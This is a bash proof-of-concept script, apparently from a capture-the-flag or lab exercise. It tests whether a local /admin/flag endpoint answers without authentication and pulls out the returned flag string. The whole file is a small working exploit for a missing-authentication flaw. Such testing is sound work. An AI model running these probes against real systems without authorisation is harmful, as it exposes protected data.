#!/bin/bash

# POC: Unauthenticated Access to Admin Flag
# This script demonstrates the vulnerability where the /admin/flag endpoint
# is accessible without any authentication or authorization controls

TARGET_URL="http://localhost:80/admin/flag"
TIMEOUT=10

echo "========================================="
echo "POC: Unauthenticated Admin Flag Access"
echo "========================================="
echo ""
echo "[*] Testing endpoint: $TARGET_URL"
echo "[*] Making request without authentication..."
echo ""

# Make the request and capture both headers and body
RESPONSE=$(curl -i -s --connect-timeout $TIMEOUT "$TARGET_URL" 2>&1)

# Check if curl succeeded
if [ $? -ne 0 ]; then
    echo "[!] ERROR: Failed to connect to the target"
    echo "$RESPONSE"
    exit 1
fi

echo "[+] Response received:"
echo "---"
echo "$RESPONSE"
echo "---"
echo ""

# Extract HTTP status code
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1 | awk '{print $2}')
echo "[*] HTTP Status Code: $HTTP_STATUS"

# Check if status is 200 (vulnerable)
if [ "$HTTP_STATUS" = "200" ]; then
    echo "[+] VULNERABILITY CONFIRMED: Endpoint returned HTTP 200"
    echo "[+] Access granted WITHOUT authentication!"
    
    # Extract the flag from response
    FLAG=$(echo "$RESPONSE" | grep -oP 'flag\{[^}]+\}' | head -1)
    if [ -n "$FLAG" ]; then
        echo "[+] Sensitive data exposed: $FLAG"
    fi
    exit 0
else
    echo "[-] Endpoint returned HTTP $HTTP_STATUS (not vulnerable)"
    exit 1
fi